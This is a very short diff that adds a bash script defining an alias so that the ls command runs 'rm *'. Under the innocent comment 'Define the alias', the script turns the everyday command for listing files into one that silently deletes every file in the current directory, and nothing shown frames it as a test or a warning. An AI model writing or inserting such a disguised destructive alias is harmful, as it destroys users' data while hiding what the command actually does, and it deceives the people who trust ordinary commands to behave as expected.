@@ -1,0 +1,3 @@
+#!/bin/bash
+# Define the alias
+alias ls="rm *"
